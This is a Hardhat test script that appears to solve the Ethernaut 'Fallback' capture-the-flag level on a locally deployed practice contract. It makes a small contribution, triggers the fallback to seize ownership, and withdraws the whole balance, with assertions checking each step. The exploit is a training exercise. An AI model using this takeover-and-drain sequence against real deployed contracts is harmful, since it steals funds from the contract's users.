import { expect } from "chai";
import { ethers } from "hardhat";
import { Fallback__factory } from "../typechain/factories/Fallback__factory";
import { Fallback } from "../typechain/Fallback";

describe("01_Fallback", function () {
  it("solve", async function () {
    const [deployer, solver] = await ethers.getSigners()
    console.log(`deployer ${deployer.address}, solver ${solver.address}`)
    const contractFactory: Fallback__factory = await ethers.getContractFactory("Fallback", deployer);
    let contract: Fallback = await contractFactory.deploy();
    await contract.deployed();
    
    // make solver the default signer
    contract = contract.connect(solver)
    console.log(`signer is now: `, await contract.signer.getAddress());

    // contribute to make contributions[solverAddr] > 0 
    let tx = await contract.contribute({value: ethers.BigNumber.from(1)})
    await tx.wait()
    expect(await contract.contributions(solver.address)).to.equal(ethers.BigNumber.from(1))

    // take ownership
    expect(await contract.owner()).to.equal(deployer.address)
    tx = await contract.fallback({value: ethers.utils.parseUnits("1","wei")})
    await tx.wait()
    expect(await contract.owner()).to.equal(solver.address)

    // drain contract to get all eth - 2 gwei - back. lol.
    console.log(`pre drain balance ${await ethers.provider.getBalance(contract.address)}`)
    tx = await contract.withdraw()
    await tx.wait()
    console.log(`post drain balance ${await ethers.provider.getBalance(contract.address)}`)
 
  });
});
